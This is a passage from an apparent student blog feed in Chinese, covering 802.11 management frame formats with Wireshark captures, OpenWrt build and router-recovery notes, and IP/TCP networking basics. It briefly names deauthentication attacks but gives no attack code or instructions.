id="802-11协议格式"><a href="#802-11协议格式" class="headerlink" title="802.11协议格式"></a>802.11协议格式</h2><p>我们知道数据链路层是一个很靠近底层的通信协议，它使用Bit来表示信息(也使用Bit来标识数据包的开始和结束)，所以数据链路层的协议格式并没有强制要求一个固定的长度，即802.11协议长度是可变的。不同功能的数据帧长度会不一样。这一特性说明mac802.11数据帧显得更加灵活，然而，也会更加复杂。</p><p>mac 802.11的数据帧长度不定主要是由于以下几点决定的：</p><ol><li>mac地址数目不定，根据帧类型不同，mac 802.11的mac地址数会不一样。比如说 ACK帧仅有一个mac地址，而数据帧有3个mac地址，在WDS模式下，帧头有4个mac地址。</li><li>802.11的管理帧所携带的信息长度不定，在管理帧中，不仅仅只有一些类似于mac地址，分片标志之类的这些信息，而且另外还会包括一些其它的信息，这些信息有关于安全设置的，有关于物理<br>通信的，比如说我们的SSID名称就是通过管理帧获得的。AP会根据不同的情况发送包含有不同信息的管理帧。 </li><li>加密(wep,wpa等)信息，QOS(quality of service)信息，若有加密的数据帧格式和没有加密的数据帧格式还不一样，加密数据帧格式还多了个加密头，用于解密用。</li></ol><h3 id="管理帧协议格式"><a href="#管理帧协议格式" class="headerlink" title="管理帧协议格式"></a>管理帧协议格式</h3><ol><li><p>Beacon(信标)帧<br><img src="/images/beacon.jpg"></p></li><li><p>Probe Request(探测请求)帧<br>![](&#x2F;images&#x2F;Probe Request.jpg)</p></li><li><p>Probe Response(探测响应)帧<br>![](&#x2F;images&#x2F;Probe Response.jpg)</p></li><li><p>ATIM帧<br><img src="/images/ATIM.jpg"></p></li><li><p>Disassociation(解除关联)与Deauthentication(解除认证)帧<br><img src="/images/Deauthentication.jpg"></p></li><li><p>Association Request(关联请求)帧<br><img src="/images/Association.jpg"></p></li><li><p>Reassociation Request(重新关联请求)帧<br><img src="/images/Reassociation.jpg"></p></li><li><p>Authentication(身份认证)帧<br><img src="/images/Authentication.jpg"></p></li><li><p>帧控制结构(Frame Control)</p></li></ol><ol><li>Protocol Version: (协议版本)通常为0</li><li>Type: 帧类型，管理帧: 00 </li><li>Subtype: 进一步判断帧的子类型<br> 3.1) Beacon(信标)帧<br> 3.2) Probe Request(探测请求)帧<br> 3.3) Probe Response(探测响应)帧<br> 3.4) ATIM帧<br> 3.5) Disassociation(解除关联)<br> 3.6) Deauthentication(解除认证)帧<br> 3.7) Association Request(关联请求)帧<br> 3.8) Reassociation Request(重新关联请求)帧<br> 3.9) Authentication(身份认证)帧</li><li>To DS: 表明该帧是否是BSS向DS发送的帧 </li><li>From DS: 表明该帧是否是DS向BSS发送的帧 </li><li>More Fragment: 用于说明长帧被分段的情况，是否还有其它的帧，如果有则该值设置为1</li><li>Retry(重传域): 表示该分段是先前传输分段的重发帧。 </li><li>Power Management: 表示传输帧以后，站所采用的电源管理模式<br> 8.1) 为1: STA处于power_save模式<br> 8.2) 为0: STA处于active模式</li><li>More Data: 表示有很多帧缓存到站中。即至少还有一个数据帧要发送给STA是设置为1。 </li><li>Protected Frame: 表示根据WEP(Wired Equivalent Privacy)算法对帧主体进行加密。如果帧体部分包含被密钥套处理过的数据，则设置为1，否则设置为0 </li><li>Order(序号域): 在长帧分段传送时，该域设置为1表示接受者应该严格按照顺序处理该帧，否则设置为0</li></ol><ol start="2"><li><p>Duration&#x2F;ID(持续时间&#x2F;标识)<br>表明该帧和它的确认帧将会占用信道多长时间，Duration 值用于网络分配向量(NAV)计算 </p></li><li><p>Address Fields(地址域): </p><ol><li>Destination Address</li><li>Source Address</li><li>BSS ID</li></ol></li><li><p>Sequence Control(序列控制域): 用于过滤重复帧</p><ol><li>MSDU(MAC Server Data Unit), 12位序列号(Sequence Number)</li><li>MMSDU(MAC Management Server Data Unit), 4位片段号(Fragment Number)组成</li></ol></li><li><p>Frame Body(Data): 发送或接收的信息。对于不同类型的数据帧来说，这个域的格式差别较大</p></li></ol><ol><li>Beacon(信标)帧<br> 1.1) Timestamp(时戳)位: 可用来同步 BSS 中的工作站 BSS 的主计时器会定期发送目前已作用的微秒数。当计数器到达最大值时，便会从头开始计数<br> 1.2) Beacon interval位: AP点每隔一段时间就会发出的Beacon(信标)信号，用来宣布 802.11网络的存在。我们打开无线连接的时候之所以能看到很多Wi-Fi点就是因为它<br> 1.3) Capability information位: 发送Beacon信号的时候，它被用来通知各方，该网络具备哪种性能<br> 1.4) SSID服务集标识(Service Set Identity): 由字节所形成的字串，用来标示所属网络的BSSID，即我们在Wi-Fi连接前看到的接入点名称<br> 1.5) 跳频参数组合(PH Parameter Set): 包含了加入 802.11跳频(frequency-hopping)网络所需要的参数<br> 1.6) 直接序列参数集合(DS Parameter Set): 指明网络所使用的信道数<br> 1.7) 免竞争参数集合(CF Parameter Set): 出现在支持免竞争接入点所发送的 Beacon帧中，并非必须<br> 1.8) IBSS 参数集合(IBSS Parameter Set): 指明ATIM window (数据待传指示通知信息间隔期间)<br> 1.9) TIM数据待传信息(Traffic Indication Map): 指示有哪些工作站需要接收待传数据<br> 1.10) Country: 国家识别码<br> 1.11) 功率限制(Power Constraint): 让网络得以向工作站传达其所允许的最大传输功率<br> 1.12) 信道切换宣告(Channel Switch Announcement): 为了警告网络中的工作站即将变换信道<br> 1.13) 禁声(Quiet): 为了避免与特定的军事雷达技术彼此干扰<br> 1.14) 发射功率控制报告(TPC Report): 指明链路的衰减情况，可以帮助工作站了解该如何调整传输功率<br> 1.15) 扩展物理层(ERP)<br> 1.16) 支持速率(Supported Rates): 无线局域网络支持数种标准速率。当移动工作站试图加入网络，会先检视该网络所使用的数据速率。有些速率是强制性的，每部工作站都必须支持,有些则是选择性的<br> 1.17) RSN强健安全网络(Robust Security Network)</li><li>Probe Request(探测请求)帧<br> 2.1) SSID服务集标识(Service Set Identity): 由字节所形成的字串，用来标示所属网络的BSSID，即我们在Wi-Fi连接前看到的接入点名称<br> 2.2) Supported Rate(支持速率)<br> 2.3) 扩展支持速率(Extended Supported Rate)</li><li>Probe Response(探测响应)帧<br> 3.1) Timestamp(时戳)位: 可用来同步 BSS 中的工作站 BSS 的主计时器会定期发送目前已作用的微秒数。当计数器到达最大值时，便会从头开始计数<br> 3.2) Beacon interval位: AP点每隔一段时间就会发出的Beacon(信标)信号，用来宣布 802.11网络的存在。我们打开无线连接的时候之所以能看到很多Wi-Fi点就是因为它<br> 3.3) Capability information位: 发送Beacon信号的时候，它被用来通知各方，该网络具备哪种性能<br> 3.4) SSID服务集标识(Service Set Identity): 由字节所形成的字串，用来标示所属网络的BSSID，即我们在Wi-Fi连接前看到的接入点名称<br> 3.5) 支持速率(Supported Rates): 无线局域网络支持数种标准速率。当移动工作站试图加入网络，会先检视该网络所使用的数据速率<br> 3.6) 跳频参数组合(PH Parameter Set): 包含了加入 802.11跳频(frequency-hopping)网络所需要的参数<br> 3.7) 直接序列参数集合(DS Parameter Set): 指明网络所使用的信道数<br> 3.8) 免竞争参数集合(CF Parameter Set): 出现在支持免竞争接入点所发送的 Beacon帧中，并非必须<br> 3.9) IBSS 参数集合(IBSS Parameter Set): 指明ATIM window (数据待传指示通知信息间隔期间)<br> 3.10) Country: 国家识别码<br> 3.11) FH Hopping Parameters<br> 3.12) FH Pattern Table<br> 3.13) 功率限制(Power Constraint): 让网络得以向工作站传达其所允许的最大传输功率<br> 3.13) 信道切换宣告(Channel Switch Announcement): 为了警告网络中的工作站即将变换信道<br> 3.14) 禁声(Quiet): 为了避免与特定的军事雷达技术彼此干扰<br> 3.15) IBSS 动态选项(IBSS DFS):在 IBSS 中负责动态选频的工作站可以在管理帧中传递 IBSS DFS 信息元素<br> 3.16) 发射功率控制报告(TPC Report): 指明链路的衰减情况，可以帮助工作站了解该如何调整传输功率<br> 3.17) 扩展物理层(ERP)<br> 3.18) 扩展支持速率(Extended Supported Rate)<br> 3.19) RSN强健安全网络(Robust Security Network)</li><li>ATIM帧</li><li>Disassociation(解除关联)<br> 5.1) Beacon Code</li><li>Deauthentication(解除认证)帧<br> 6.1) Beacon Code</li><li>Association Request(关联请求)帧<br> 7.1) Capability information位: 发送Beacon信号的时候，它被用来通知各方，该网络具备哪种性能<br> 7.2) Listen interval位: 为了节省电池的电力，工作站可以暂时关闭 802.11网络接口的天线。当工作站处于休眠状态，接入点必须为之暂存帧<br> 7.3) SSID服务集标识(Service Set Identity): 由字节所形成的字串，用来标示所属网络的BSSID，即我们在Wi-Fi连接前看到的接入点名称<br> 7.4) Supported Rate(支持速率)</li><li>Reassociation Request(重新关联请求)帧<br> 8.1) Capability information位: 发送Beacon信号的时候，它被用来通知各方，该网络具备哪种性能<br> 8.2) Listen interval位: 为了节省电池的电力，工作站可以暂时关闭 802.11网络接口的天线。当工作站处于休眠状态，接入点必须为之暂存帧<br> 8.3) Current AP Address位: 使用Current AP Address(目前接入点的地址)位来表明目前所连接的接入点的 MAC地址<br> 8.4) SSID服务集标识(Service Set Identity): 由字节所形成的字串，用来标示所属网络的BSSID，即我们在Wi-Fi连接前看到的接入点名称<br> 8.5) Supported Rate(支持速率)</li><li>Authentication(身份认证)帧<br> 9.1) Authentication Algorithm Number: 指明认证程序所使用的认证类型<br> 9.2) Authentication Transaction Sequence Number: 用以追踪身份认证的进度<br> 9.3) Status Code: 状态代码用来表示某项过程成功或失败<br> 9.4) 质询口令(Challenge Text): 802.11所定义的共享密钥身份认证系统。会要求移动工作站必须成功解码一段加密过的质询口令。这段质询口令的发送系通过 Challenge Text(质询口令)信息元素</li></ol><ol start="6"><li>FCS(CRC): 包括32位的循环冗余校验(CRC)，用于检错，注意是检错不是纠错</li></ol><h1 id="WiFi连接交互过程"><a href="#WiFi连接交互过程" class="headerlink" title="WiFi连接交互过程"></a>WiFi连接交互过程</h1><p><strong>有了802.11协议的基本格式之后，我们可以使用wireshark进行抓包实验，验证一下我们的理论</strong><br>启动无线网卡的Monotor模式，前面文章里面有讲过，然后启动wireshark，选择wlan0mon网卡即可。</p><h2 id="AP发送Beacon广播管理帧"><a href="#AP发送Beacon广播管理帧" class="headerlink" title="AP发送Beacon广播管理帧"></a>AP发送Beacon广播管理帧</h2><p><img src="/images/zhuabao1.png"></p><p>因为AP发送的这个Beacon管理帧数据包是广播地址，所以我们的PCMIA内置网卡、或者USB外界网卡会接收到这个数据包，然后在我们的”无线连接列表”中显示出来：<br><img src="/images/wlan.png"></p><h2 id="客户端向承载指定SSID的AP发送Probe-Request-探测请求-帧"><a href="#客户端向承载指定SSID的AP发送Probe-Request-探测请求-帧" class="headerlink" title="客户端向承载指定SSID的AP发送Probe Request(探测请求)帧"></a>客户端向承载指定SSID的AP发送Probe Request(探测请求)帧</h2><p><img src="/images/zhuabao2.png"></p><p>当我们点击”连接”的时候，无线网卡就会发送一个Prob数据帧，用来向AP请求连接</p><h2 id="AP接入点对客户端的SSID连接请求进行应答"><a href="#AP接入点对客户端的SSID连接请求进行应答" class="headerlink" title="AP接入点对客户端的SSID连接请求进行应答"></a>AP接入点对客户端的SSID连接请求进行应答</h2><p><img src="/images/zhuabao3.png"></p><p>AP对客户端的连接作出了回应。</p><h2 id="客户端对目标AP请求进行身份认证-Authentication"><a href="#客户端对目标AP请求进行身份认证-Authentication" class="headerlink" title="客户端对目标AP请求进行身份认证(Authentication)"></a>客户端对目标AP请求进行身份认证(Authentication)</h2><p>这个包没有抓到……</p><h2 id="AP对客户端的身份认证-Authentication-请求作出回应"><a href="#AP对客户端的身份认证-Authentication-请求作出回应" class="headerlink" title="AP对客户端的身份认证(Authentication)请求作出回应"></a>AP对客户端的身份认证(Authentication)请求作出回应</h2><p><img src="/images/zhuabao4.png"></p><h2 id="客户端向AP发送连接-Association-请求"><a href="#客户端向AP发送连接-Association-请求" class="headerlink" title="客户端向AP发送连接(Association)请求"></a>客户端向AP发送连接(Association)请求</h2><p><img src="/images/zhuabao5.png"></p><h2 id="AP对连接-Association-请求进行回应"><a href="#AP对连接-Association-请求进行回应" class="headerlink" title="AP对连接(Association)请求进行回应"></a>AP对连接(Association)请求进行回应</h2><p>这个包也没有抓到……</p><p>AP对客户端的连接请求(Association)予以了回应(包括SSID、性能、加密设置等)。至此，Wi-Fi的连接身份认证交互就全部结束了，之后就可以正常进行数据发送了</p><h2 id="客户端向AP请求断开连接-Disassociation"><a href="#客户端向AP请求断开连接-Disassociation" class="headerlink" title="客户端向AP请求断开连接(Disassociation)"></a>客户端向AP请求断开连接(Disassociation)</h2><p>这个也没抓到对应数据报。</p><p><img src="/images/woshou.png"></p><p>**由此，我们可以发现，基于对数据帧格式的了解，黑客可以发起一些针对协议的攻击 **前面几篇文章介绍过几种无线DoS的攻击，其中Deanthentication攻击，Disassociation攻击基于协议的攻击。</p>]]></content>
    
    
    
    <tags>
      
      <tag>计算机网络</tag>
      
      <tag>协议</tag>
      
      <tag>802.11</tag>
      
      <tag>无线网络安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>OpenWrt探索之路（一）</title>
    <link href="/blog/2018/10/29/OpenWrt%E6%8E%A2%E7%B4%A2%E4%B9%8B%E8%B7%AF%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/blog/2018/10/29/OpenWrt%E6%8E%A2%E7%B4%A2%E4%B9%8B%E8%B7%AF%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p><strong>漫长的国创项目之路开始了第一步，在学长的指导下，我开始学习OpenWrt这个开源的路由器系统，来设计我们新的路由器协议，简单总结一下这周学的东西，方便以后自己查阅。</strong></p><p><img src="/images/bxb.png"></p><span id="more"></span><h2 id="OpenWrt系统的安装"><a href="#OpenWrt系统的安装" class="headerlink" title="OpenWrt系统的安装"></a>OpenWrt系统的安装</h2><ul><li><p>首先，我们需要确认所有的依赖软件已安装。下面以Debian&#x2F;Ubuntu为例：</p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs q">sudo apt-<span class="hljs-built_in">get</span> install subversion g++ zlib1g-<span class="hljs-built_in">dev</span> build-essential git python rsync man-db<br>sudo apt-<span class="hljs-built_in">get</span> install libncurses5-<span class="hljs-built_in">dev</span> gawk gettext unzip file libssl-<span class="hljs-built_in">dev</span> wget zip time<br></code></pre></td></tr></table></figure></li><li><p>接下来，使用以下命名获取OpenWrt的源代码： </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/openwrt/</span>openwrt.git<br>cd openwrt<br></code></pre></td></tr></table></figure><p>这里找了好多源，官网上给的源无法git，会出现错误，只好使用Github上面的源。</p></li><li><p>下载完OpenWrt的源码后，为了使OpenWrt支持更多的软件，需要更新和安装其它源上面的软件。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">.<span class="hljs-regexp">/scripts/</span>feeds update -a<br>.<span class="hljs-regexp">/scripts/</span>feeds install -a<br></code></pre></td></tr></table></figure><p>这里还是会出现无法更新的问题，还是源的问题，这里还是把目录下的feeds.conf.default文件打开，修改其中的源：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">src-git packages https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/openwrt/</span>packages.git<br>src-git luci https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/openwrt/</span>luci.git<br>src-git routing https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/openwrt-routing/</span>packages.git<br>src-git telephony https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/openwrt/</span>telephony.git<br></code></pre></td></tr></table></figure></li><li><p>最后一个命令就是打开菜单配置你想编译出来的功能和路由器型号等等：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">make menuconfig</span><br></code></pre></td></tr></table></figure><p>就拿我手上现有的NETGEAR WNDR4300来说：</p></li></ul><p> Target System —&gt; Atheros AR7xxx&#x2F;AR9xxx<br> Subtarget —&gt; Generic devices with NAND flash<br> Target Profile —&gt; NETGEAR WNDR4300v1  </p><p>然后退出并选择保存。<br>由于具体的config中的配置我还没去了解，所以具体的config的配置将会在下一篇博客写出。</p><ul><li>编译：<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">make FORCE\_UNSAFE\<span class="hljs-attribute">_CONFIGURE</span>=1 -j N <span class="hljs-attribute">V</span>=s<br><br></code></pre></td></tr></table></figure>说明一下，make的时候记得加系统变量FORCE_UNSAFE_CONFIGURE&#x3D;1 这样就不会报错了（错误信息里面给的，至于为什么我也不是很清楚）。-j N中N为CPU内核数+1，这种方法可以加快编译速度，但是容易出错。如果遇到编译错误，在没有-j N的情况下再次编译。建议在并行编译之前使用make download命令以防止出现这些错误（对于那些拥有更快Internet连接的用户来说，使用-jN命令在下载环节通常可以更安全）。V&#x3D;s是显示详细信息。</li></ul><p><strong>到此，Openwrt的大致安装和编译过程介绍完毕。</strong></p><h2 id="路由器救砖之路"><a href="#路由器救砖之路" class="headerlink" title="路由器救砖之路"></a>路由器救砖之路</h2><p>咳咳咳，原本以为自己直接make编译出了相应的刷机文件，刷进路由器就可以使用最简单的功能了呢，结果很不幸，路由器变成了一块板砖（具体原因推测是config文件配置问题，少选了很多东西）。于是就出现了下面的救砖之路……<br>此次使用的是TFTP刷机：</p><ol><li>首先，下载需要的固件以及Tftp软件<br>下载固件（需解压）： <a href="http://www.downloads.netgear.com/files/GDC/WNDR4300/WNDR4300_V1.0.1.60.zip">http://www.downloads.netgear.com/files/GDC/WNDR4300/WNDR4300_V1.0.1.60.zip</a><br>TFTP软件这里我使用的是Tftpd，读者可自行网上下载。</li><li>拔掉路由器连接外网的网线，仅保留与电脑的lan口连接，电脑改为固定IP：192.168.1.171（这个随意，固定的就好），子网掩码：255.255.255.0，DNS：192.168.1.1</li><li>按复位键（位于机器底部，用卡针按）不放，此时路由器应处于断电状态</li><li>通电，直到电源指示灯变为绿色并开始闪烁，使用TFTP软件上传固件，服务器IP填写192.168.1.1，稍等5分钟，然后关闭路由器电源，再打开。电脑改为DHCP自动获取IP地址，稍等几分钟路由器便会正常启动，然后浏览器键入192.168.1.1进入路由器后台管理界面即可。</li></ol><h2 id="OpenWrt系统源码目录概述"><a href="#OpenWrt系统源码目录概述" class="headerlink" title="OpenWrt系统源码目录概述"></a>OpenWrt系统源码目录概述</h2><h3 id="原始目录"><a href="#原始目录" class="headerlink" title="原始目录"></a>原始目录</h3><p>下载源码后,源文件如下图所示,下面我们来一一解释：</p><p><img src="/images/openwrt1.png"></p><ol><li>scripts<br>存放了一些脚本,使用了bash,python,perl等多种脚本语言.编译过程中,用于第三方软件包管理的feeds文件也是在这个目录当中.在编译过程中,使用到的脚本也统一放在这个目录中。</li><li>tools<br>编译时,主机需要使用一些工具软件,tools 里包含了获取和编译这些工具的命令.软件包里面有Makefile文件,有的还包含了patch.每个Makefile当中都有一句$(eval $(call HostBuild)),这表明编译这个工具是为了在主机上使用的。</li><li>config<br>存放着整个系统的配置文件</li><li>toolchain<br>嵌入式的童鞋应该都知道交叉编译链,这个文件中存放的就是编译交叉编译链的软件包.包括:binutils,gcc,libc等等。</li><li>target<br>openwrt的源码可以编译出各个平台适用的二进制文件,各平台在这个目录里定义了firmware和kernel的编译过程。</li><li>package<br>存放了openwrt系统中适用的软件包,包含针对各个软件包的Makefile。openwrt定义了一套Makefile模板.各软件参照这个模板定义了自己的信息，如软件包的版本、下载地址、编译方式、安装地址等。在二次开发过程中,这个文件夹我们会经常打交道。<br>事实上,通过.&#x2F;scripts&#x2F;feed update -a和.&#x2F;scripts&#x2F;feed install -a的软件包也会存放在这个目录之中。</li><li>include<br>openwrt的Makefile都存放在这里。文件名为 *.mk 。这里的文件上是在Makefile里被include的,类似于库文件.这些文件定义了编译过程。</li><li>其他单个文件：<br>8.1 Makefile:<br>在顶层目录执行make命令的入口文件。<br>8.2 rules.mk<br>定义了Makefile中使用的一些通用变量和函数。<br>8.3 Config.in<br>在include&#x2F;toplevel.mk中我们可以看到,这是和make menuconfig相关联的文件。<br>8.4 feeds.conf.default<br>是下载第三方一些软件包时所使用的地址。<br>8.5 LICENSE &amp; README<br>即软件许可证和软件基本说明.其中README描述了编译软件的基本过程和依赖文件。</li></ol><h3 id="生成目录"><a href="#生成目录" class="headerlink" title="生成目录"></a>生成目录</h3><p>在我们编译完成后除了下载的源码文件,多出来的部分很明显就是编译过程中新生成的.如下图: </p><p><img src="/images/openwrt2.png"></p><ol><li>feeds<br>openwrt的附加软件包管理器的扩展包索引目录.有点绕,简单来说就是下载管理软件包的。默认的feeds下载有packages、management、luci、routing、telephony。如要下载其他的软件包，需打开源码根目录下面的feeds.conf.default文件，去掉相应软件包前面的#号，然后更新源:<br>.&#x2F;scripts&#x2F;feeds update -a<br>安装下载好的包:<br>.&#x2F;scripts&#x2F;feeds install -a</li><li>build_dir<br>在前面的原始目录中,我们提到了host工具,toolchain工具还有目标文件.openwrt将在这个目录中展开各个软件包,进行编译.所以这个文件夹中包含3个子文件夹:<br>2.1 host<br>在该文件夹中编译主机使用的工具软件<br>2.2 toolchain-XXX<br>在该文件夹中编译交叉工具链<br>2.3 target-XXX<br>在此编译目标平台的目标文件,包括各个软件包和内核文件。</li><li>bin<br>保存编译完成后的二进制文件,包括:完整的bin文件,所有的ipk文件。</li><li>dl<br>在编译过程中使用的很多软件,刚开始下载源码并没有包含,而是在编译过程中从其他服务器下载的,这里是统一的保存目录。</li><li>staging_dir<br>用于保存在build_dir目录中编译完成的软件。所以这里也和build_dir有同样的子目录结构。<br>比如,在target-XXX文件夹中保存了目标平台编译好的头文件,库文件.在我们开发自己的ipk文件时,编译过程中,预处理头文件,链接动态库,静态库都是到这个子文件夹中。</li><li>tmp<br>从名字来看,是临时文件夹.在编译过程中,有大量中间临时文件需要保存,都是在这里。</li><li>logs<br>这个文件夹,有时可以看到,有时没有.这是因为这个文件夹保存的是,编译过程中出错的信息,只有当编译出错了才会出现.我们可以从这里获取信息,从而分析我们的软件编译为什么没有完成。</li></ol><p>这些只是最最基础的对基本目录的了解，以后会更深入地去了解。</p>]]></content>
    
    
    
    <tags>
      
      <tag>路由器系统</tag>
      
      <tag>无线安全</tag>
      
      <tag>OpenWrt</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计算机网络（二）</title>
    <link href="/blog/2018/10/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <url>/blog/2018/10/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p><strong>现在开始了人生中第一个项目，开始为这个项目做出准备了，根据学长的指示，深入了解一下计算机网络工作的原理。</strong></p><p><img src="/images/hxb.png"></p><span id="more"></span><h2 id="计算机网络协议为什么要分层"><a href="#计算机网络协议为什么要分层" class="headerlink" title="计算机网络协议为什么要分层?"></a>计算机网络协议为什么要分层?</h2><ol><li>各层之间相互独立：高层是不需要知道底层的功能是采取硬件技术来实现的，它只需要知道通过与底层的接口就可以获得所需要的服务；</li><li>灵活性好：各层都可以采用最适当的技术来实现，例如某一层的实现技术发生了变化，用硬件代替了软件，只要这一层的功能与接口保持不变，实现技术的变化都并不会对其他各层以及整个系统的工作产生影响； </li><li>易于实现和标准化：由于采取了规范的层次结构去组织网络功能与协议，因此可以将计算机网络复杂的通信过程，划分为有序的连续动作与有序的交互过程，有利于将网络复杂的通信工作过程化解为一系列可以控制和实现的功能模块，使得复杂的计算机网络系统变得易于设计，实现和标准化。</li></ol><h2 id="IP数据报文"><a href="#IP数据报文" class="headerlink" title="IP数据报文"></a>IP数据报文</h2><p>IP协议提供不可靠无连接的数据报传输服务，IP层提供的服务是通过IP层对数据报的封装与拆封来实现的。IP数据报的格式分为报头区和数据区两大部分，其中报头区是为了正确传输高层数据而加的各种控制信息，数据区包括高层协议需要传输的数据。</p><p>IPv4数据报如下图所示：</p><p><img src="/images/ipshujubao.png"></p><h3 id="IP头部字段"><a href="#IP头部字段" class="headerlink" title="IP头部字段"></a>IP头部字段</h3><p>第一个字段（只有四位）是<em>版本字段</em>。它包含IP数据报的版本号：IPv4为4，IPv6为6。IPv4和IPv6头部版本除版本字段位置相同外再无其它是一样的。因此，这两个协议不能直接相互操作，主机或者路由器必须分别处理IPv4和IPv6。</p><p><em>Internet头部长度（IHL）字段</em>保存IPv4头部中32位字的数量，包括任何选项。由于它是一个4位的字段，所以IPv4的头部被限制为最多15个32位字，即60字节。IPv6中不存在这个字段，其头部的长度固定为40字节。</p><p><em>总长度字段</em>是IPV4数据报的总长度，以字节为单位。通过这个字段长度和IHL我们就可以知道数据报的数据部分从哪里开始，以及它的长度。由于它是一个16位的字段，所以IPv4的数据报最大长度（包括头部）为65535字节。</p><p><em>标识字段</em>帮助标识由IPv4主机发送的数据报。为了避免将一个数据报分片和其他数据报分片混淆，发送主机通常在每次发送数据报时都将一个内部计数器加一，并将该计数器值复制到IPv4标识字段。</p><p><em>生存期（TTL）字段</em>用于设置一个数据报可经过的路由器数量上限。发送方将它初始化为某个值（[RFC1122]建议为64，但128或255也不少见），每台路由器在转发该数据报时将该值减1。当这个字段值达到0时，该数据报被丢弃，并使用一个ICMP消息通知发送方。这可以防止由于出现不希望的路由环路而导致数据报在网络中永远循环。</p><p>IPv4头部中的<em>协议字段</em>包含一个数字，表示数据报有效载荷部分的数据类型。最常用的值为17(UDP)和6(TCP)。这提供了多路分解的功能，以便IP协议可用于携带多种协议类型的有效载荷。</p><p><em>头部校验和字段</em>仅计算IPv4头部。理解这一点很重要，因为这意味着IP协议不会检查IPv4数据报有效载荷（例如TCP和UDP数据）的正确性。为了确保IP数据报的有效载荷部分已经正确传输，其它协议必须通过自己的数据完整性检验机制来检查重要数据。IPv6头部没有任何校验字段。</p><h2 id="TCP-x2F-IP中的分解"><a href="#TCP-x2F-IP中的分解" class="headerlink" title="TCP&#x2F;IP中的分解"></a>TCP&#x2F;IP中的分解</h2><p><img src="/images/tcpipfenjie.jpg"></p><h2 id="访问一个网址的过程背后发生的那些事"><a href="#访问一个网址的过程背后发生的那些事" class="headerlink" title="访问一个网址的过程背后发生的那些事"></a>访问一个网址的过程背后发生的那些事</h2><p>1)<strong>回车键按下后，浏览器首先会对输入的地址数据进行解析</strong></p><p>1.1、检查输入的URL是http协议，请求资源是对应主机名网站主页。<br>1.2、然后检查浏览器的严格安全传输列表（ HSTS列表 ），如果网站在列表中，则浏览器直接使用https协议进行传输，否则直接使用http协议传输，或者先使用http协议向网站服务器发送一个请求，服务器返回浏览器只能以https协议进行，则接下来仍然只以https协议来进行传输。<br>1.3、然后检查输入地址中是否有非ASCII码的unicode字符，如果有的话进行字符转换。<br>1.4、当协议或主机名不合法时，浏览器会将地址栏中输入的内容传递给默认的搜索引擎。</p><p>2)<strong>然后进行DNS递归查询</strong></p><p>2.1、DNS查询过程中，首先在缓存中进行查询，找到直接返回结果否则<br>2.2、再使用gethostbynme库函数进行查询，库函数查询过程中，首先到hosts中进行检查，查看域名是否在本地hosts文件中，找到直接返回结果，如果没有记录且库函数查询也没有记录则<br>2.3、以上查询均未果，则会向DNS服务器发送一条DNS查询请求。查询DNS服务器通常是在本地路由器或者ISP的缓存DNS服务器上进行，如果对应记录存在，则返回该映射地址，并且该地址会被标记为非权威服务器应答标签，如果对应记录不存在，则会递归向高层 DNS 服务器做查询，直到返回最终结果。<br>2.4、如果DNS查询失败，则返回无法解析DNS地址，停止，否则浏览器根据查询到的对应ip地址进行下一步操作，即使用套接字进行数据访问。</p><p>3)<strong>使用套接字进行数据访问</strong></p><p>3.1、浏览器获得目标IP地址，以及URL中给出的端口号（http 协议默认端口号是 80， https 默认端口号是 443），调用系统库函数socket，请求一个TCP流套接字。<br>3.2、该请求首先被交给传输层，封装成TCP segment，然后被送往网络层，添加目标服务器IP地址以及本机的IP地址，封装成TCP packet，再接下来会进入链路层，在封包中加入frame头部，包含本机网卡的MAC地址和网关MAC地址等，形成最终的TCP封包。<br>3.3、TCP封包完成之后，会通过以太网等网络进行传输到目标地址。</p><p><img src="/images/fengbao.png"></p><p>4)<strong>建立TCP连接</strong></p><p>建立TCP连接会进行三次握手的过程，然后进行发送HTTP请求过程和接收过程。<br>4.1、进行三次握手，首先向服务器发送一个syn报文，其中syn&#x3D;1，seq number&#x3D;1022(随机)；<br>4.2、服务器接收到syn报文，根据syn&#x3D;1判断客户端请求建立连接，并返回一个syn报文，为第一次握手，其中ack number&#x3D;1023(客户端seq number+1)，seq number&#x3D;2032(随机)，syn&#x3D;1，ack&#x3D;1；<br>4.3、客户端根据服务器的syn报文，确认其ack number是否与上一次发送的seq number+1相等，且ack&#x3D;1，确认正确，则回应一个ack报文，为第二次握手，即ack number&#x3D;2033(服务器seq number+1)，ack&#x3D;1，<br>4.4、服务器根据接收到的ack报文，确认ack number是否与上一次发送的seq 